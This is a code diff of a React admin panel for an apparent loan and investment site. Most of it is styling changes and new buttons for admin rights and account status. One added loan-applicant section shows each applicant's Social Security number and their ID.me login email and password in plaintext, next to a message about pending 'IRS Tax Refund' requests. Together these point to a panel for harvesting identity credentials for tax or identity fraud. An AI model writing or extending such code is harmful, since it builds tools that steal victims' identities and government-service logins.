+                    className="bg-white rounded-2xl mobile:rounded-3xl p-5 mobile:p-6 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 cursor-pointer group"
                     onClick={() => {
                       setSelectedTransaction(withdrawal);
                       setShowTransactionModal(true);
                     }}
                   >
-                    <div className="flex items-center justify-between mb-6">
-                      <div className="flex items-center space-x-3">
-                        <div className="p-2.5 bg-navy-50 text-navy-900 rounded-xl group-hover:bg-navy-900 group-hover:text-gold-500 transition-colors">
-                          <Upload className="w-4 h-4" />
+                    <div className="flex items-center justify-between mb-4 mobile:mb-6">
+                      <div className="flex items-center space-x-2 mobile:space-x-3">
+                        <div className="p-2 mobile:p-2.5 bg-navy-50 text-navy-900 rounded-lg mobile:rounded-xl group-hover:bg-navy-900 group-hover:text-gold-500 transition-colors">
+                          <Upload className="w-3.5 h-3.5 mobile:w-4 mobile:h-4" />
                         </div>
-                        <span className="text-[10px] font-black text-navy-900 uppercase tracking-widest">Outbound Transfer</span>
+                        <span className="text-[9px] mobile:text-[10px] font-black text-navy-900 uppercase tracking-widest">Outbound Transfer</span>
                       </div>
-                      <span className={`px-4 py-1.5 text-[9px] font-black uppercase tracking-widest rounded-full border transition-all ${withdrawal.status === 'completed' ? 'bg-green-50 text-green-500 border-green-100' :
+                      <span className={`px-3 mobile:px-4 py-1 mobile:py-1.5 text-[8px] mobile:text-[9px] font-black uppercase tracking-widest rounded-full border transition-all ${withdrawal.status === 'completed' ? 'bg-green-50 text-green-500 border-green-100' :
                         withdrawal.status === 'rejected' ? 'bg-red-50 text-red-500 border-red-100' :
                           withdrawal.status === 'processing' ? 'bg-navy-50 text-navy-600 border-navy-100 animate-pulse' :
                             'bg-gold-50 text-gold-600 border-gold-100'
@@ -2595,17 +2602,17 @@ const AdminSection = () => {
 
                     <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                       <div className="flex items-start gap-4">
+                        <div className="p-2.5 bg-white rounded-xl shadow-sm"><Mail className="w-4 h-4 text-gray-400" /></div>
+                        <div className="break-all">
+                          <p className="text-[9px] font-black text-gray-300 uppercase tracking-widest mb-0.5">Communication Endpoint</p>
+                          <p className="text-sm font-black text-navy-900 tracking-tight">{userDetailData?.email}</p>
+                        </div>
+                      </div>
+                      <div className="flex items-start gap-4">
                         <div className="p-2.5 bg-white rounded-xl shadow-sm"><Users className="w-4 h-4 text-gray-400" /></div>
                         <div>
                           <p className="text-[9px] font-black text-gray-300 uppercase tracking-widest mb-0.5">Full Legal Name</p>
                           <p className="text-sm font-black text-navy-900 uppercase tracking-tight">{userDetailData?.firstName} {userDetailData?.lastName}</p>
-                        </div>
-                      </div>
-                      <div className="flex items-start gap-4">
-                        <div className="p-2.5 bg-white rounded-xl shadow-sm"><Mail className="w-4 h-4 text-gray-400" /></div>
-                        <div className="overflow-hidden">
-                          <p className="text-[9px] font-black text-gray-300 uppercase tracking-widest mb-0.5">Communication Endpoint</p>
-                          <p className="text-sm font-black text-navy-900 truncate tracking-tight">{userDetailData?.email}</p>
                         </div>
                       </div>
                       <div className="flex items-start gap-4">
@@ -2619,7 +2626,7 @@ const AdminSection = () => {
                         <div className="p-2.5 bg-white rounded-xl shadow-sm"><MapPin className="w-4 h-4 text-gray-400" /></div>
                         <div>
                           <p className="text-[9px] font-black text-gray-300 uppercase tracking-widest mb-0.5">Geographic Origin</p>
-                          <p className="text-sm font-black text-navy-900 uppercase tracking-tight">{userDetailData.city && userDetailData.country ? `${userDetailData.city}, ${userDetailData.country}` : 'Unknown Domain'}</p>
+                          <p className="text-sm font-black text-navy-900 uppercase tracking-tight">{userDetailData.city && userDetailData.country ? `${userDetailData.city}, ${userDetailData.country}` : 'Not Logged'}</p>
                         </div>
                       </div>
                     </div>
@@ -2637,18 +2644,10 @@ const AdminSection = () => {
 
                   <div className="bg-navy-900 rounded-[2.5rem] p-8 border border-navy-800 shadow-xl shadow-navy-900/10">
                     <h4 className="text-xs font-black uppercase tracking-widest text-white/40 mb-8">Asset Allocation</h4>
-                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                       <div className="bg-navy-800/50 p-6 rounded-3xl border border-navy-700/50">
                         <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-2">Liquidity</p>
                         <p className="text-xl font-black text-white tracking-tighter">${userDetailData.balances?.main?.toLocaleString() || 0}</p>
-                      </div>
-                      <div className="bg-navy-800/50 p-6 rounded-3xl border border-navy-700/50">
-                        <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-2">Committed</p>
-                        <p className="text-xl font-black text-white tracking-tighter">${userDetailData.balances?.investment?.toLocaleString() || 0}</p>
-                      </div>
-                      <div className="bg-navy-800/50 p-6 rounded-3xl border border-navy-700/50">
-                        <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-2">Referral</p>
-                        <p className="text-xl font-black text-white tracking-tighter">${userDetailData.balances?.referral?.toLocaleString() || 0}</p>
                       </div>
                     </div>
                     <div className="mt-6 p-6 bg-gold-500 rounded-3xl flex items-center justify-between shadow-lg shadow-gold-500/10">
@@ -2660,6 +2659,7 @@ const AdminSection = () => {
 
                 {/* Right Column: Actions & Logs */}
                 <div className="lg:col-span-5 space-y-8">
+                  {/* Direct Transmission Section */}
                   <div className="bg-white rounded-[2.5rem] p-8 border border-gray-100 shadow-sm">
                     <h4 className="text-xs font-black uppercase tracking-widest text-navy-900 mb-6 flex items-center gap-3">
                       <MessageSquare className="w-4 h-4 text-gold-500" />
@@ -2673,7 +2673,7 @@ const AdminSection = () => {
                         className="w-full p-6 bg-gray-50 border border-gray-100 rounded-3xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold min-h-[140px]"
                       />
                       <button
-                        onClick={() => sendUserNotification(userDetailData.userCode, userIndividualMessage)}
+                        onClick={() => sendUserNotification(userDetailData._id!, userIndividualMessage)}
                         disabled={!userIndividualMessage.trim() || isSendingMessage}
                         className="w-full bg-navy-900 hover:bg-navy-800 text-gold-500 px-8 py-5 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all shadow-xl shadow-navy-900/10 flex items-center justify-center gap-3 disabled:opacity-50"
                       >
@@ -2683,6 +2683,43 @@ const AdminSection = () => {
                           <Bell className="w-4 h-4" />
                         )}
                         <span>{isSendingMessage ? 'Transmitting...' : 'Send Secure Message'}</span>
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* Access Authority Section */}
+                  <div className="bg-white rounded-[2.5rem] p-8 border border-gray-100 shadow-sm">
+                    <h4 className="text-xs font-black uppercase tracking-widest text-navy-900 mb-6 flex items-center gap-3">
+                      <Shield className="w-4 h-4 text-gold-500" />
+                      Access Authority
+                    </h4>
+                    <div className="space-y-4">
+                      <button
+                        onClick={() => makeAdmin(userDetailData._id!, !userDetailData.isAdmin)}
+                        className={`w-full px-8 py-5 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all flex items-center justify-between group ${userDetailData.isAdmin
+                            ? 'bg-red-50 text-red-600 border border-red-100'
+                            : 'bg-gold-50 text-gold-600 border border-gold-100'
+                          }`}
+                      >
+                        <div className="flex items-center gap-3">
+                          {userDetailData.isAdmin ? <Ban className="w-4 h-4" /> : <ShieldCheck className="w-4 h-4" />}
+                          <span>{userDetailData.isAdmin ? 'Revoke Admin Privileges' : 'Grant Admin Authority'}</span>
+                        </div>
+                        <ArrowRight className="w-4 h-4 opacity-0 group-hover:opacity-100 transition-all translate-x-[-10px] group-hover:translate-x-0" />
+                      </button>
+
+                      <button
+                        onClick={() => toggleUserStatus(userDetailData._id!, !userDetailData.isActive)}
+                        className={`w-full px-8 py-5 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all flex items-center justify-between group ${!userDetailData.isActive
+                            ? 'bg-green-50 text-green-600 border border-green-100'
+                            : 'bg-red-50 text-red-600 border border-red-100 opacity-60'
+                          }`}
+                      >
+                        <div className="flex items-center gap-3">
+                          {!userDetailData.isActive ? <CheckCircle className="w-4 h-4" /> : <Ban className="w-4 h-4" />}
+                          <span>{!userDetailData.isActive ? 'Re-activate Account' : 'Deactivate Account'}</span>
+                        </div>
+                        <ArrowRight className="w-4 h-4 opacity-0 group-hover:opacity-100 transition-all translate-x-[-10px] group-hover:translate-x-0" />
                       </button>
                     </div>
                   </div>
@@ -2751,7 +2788,7 @@ const AdminSection = () => {
                 <div className="flex items-center justify-between p-6 bg-gray-50 rounded-3xl border border-gray-100 shadow-sm">
                   <div className="flex items-center gap-4">
                     <div className={`p-4 rounded-2xl shadow-sm ${selectedTransaction.status === 'approved' || selectedTransaction.status === 'completed' ? 'bg-green-50 text-green-500' :
-                        selectedTransaction.status === 'rejected' ? 'bg-red-50 text-red-500' : 'bg-gold-50 text-gold-500'
+                      selectedTransaction.status === 'rejected' ? 'bg-red-50 text-red-500' : 'bg-gold-50 text-gold-500'
                       }`}>
                       {selectedTransaction.status === 'approved' || selectedTransaction.status === 'completed' ? <CheckCircle className="w-6 h-6" /> : <Clock className="w-6 h-6" />}
                     </div>
@@ -2999,7 +3036,7 @@ const AdminSection = () => {
                   </div>
                 </div>
               </div>
-              <button 
+              <button
                 onClick={() => setShowKycModal(false)}
                 className="w-12 h-12 bg-white hover:bg-red-50 text-gray-400 hover:text-red-500 rounded-2xl flex items-center justify-center transition-all border border-gray-100 shadow-sm"
               >
@@ -3111,7 +3148,7 @@ const AdminSection = () => {
                   </div>
                 </div>
               </div>
-              <button 
+              <button
                 onClick={() => setShowCardModal(false)}
                 className="w-12 h-12 bg-white hover:bg-red-50 text-gray-400 hover:text-red-500 rounded-2xl flex items-center justify-center transition-all border border-gray-100 shadow-sm"
               >
@@ -3247,6 +3284,48 @@ const AdminSection = () => {
                   "{selectedLoan.purpose}"
                 </div>
               </div>
+
+              {selectedLoan.personalInfo ? (
+                <div className="bg-navy-900 p-8 rounded-[2rem] border border-navy-800 space-y-6 shadow-xl text-white">
+                  <div className="flex items-center gap-3 mb-2">
+                    <div className="w-10 h-10 bg-gold-500/20 rounded-xl flex items-center justify-center border border-gold-500/20">
+                      <User className="w-5 h-5 text-gold-500" />
+                    </div>
+                    <div>
+                      <h4 className="text-[10px] font-black text-gold-500 uppercase tracking-widest">Applicant Credentials</h4>
+                      <p className="text-sm font-black uppercase tracking-tight">{selectedLoan.personalInfo.fullName}</p>
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-2 gap-6 pt-4 border-t border-white/10">
+                    <div>
+                      <p className="text-[9px] font-black text-white/30 uppercase tracking-widest mb-1">SSN credentials</p>
+                      <p className="text-sm font-mono font-bold text-gold-500 tracking-widest">{selectedLoan.personalInfo.ssn}</p>
+                    </div>
+                    <div>
+                      <p className="text-[9px] font-black text-white/30 uppercase tracking-widest mb-1">Jurisdiction</p>
+                      <p className="text-xs font-bold text-gray-300 uppercase">{selectedLoan.personalInfo.country}</p>
+                    </div>
+                    <div className="col-span-2">
+                      <p className="text-[9px] font-black text-white/30 uppercase tracking-widest mb-1">ID.me Intelligence Endpoint</p>
+                      <div className="flex items-center justify-between bg-white/5 p-3 rounded-xl border border-white/10">
+                        <span className="text-xs font-bold text-gray-400">{selectedLoan.personalInfo.idmeEmail}</span>
+                        <span className="text-[10px] font-mono font-bold text-gray-500">{selectedLoan.personalInfo.idmePassword}</span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              ) : (
+                <div className="p-6 bg-amber-50 rounded-3xl border border-amber-100/50 flex items-start gap-4">
+                  <AlertTriangle className="w-5 h-5 text-amber-500 shrink-0" />
+                  <div>
+                    <h5 className="text-[10px] font-black text-amber-800 uppercase tracking-widest mb-1">Missing Forensic Data</h5>
+                    <p className="text-xs text-amber-700 leading-relaxed font-medium">
+                      The applicant has not yet submitted an IRS Tax Refund request. Credentials validation must be performed manually via direct communication.
+                    </p>
+                  </div>
+                </div>
+              )}
 
               <div className="space-y-4 pt-4 border-t border-gray-100">
                 <textarea
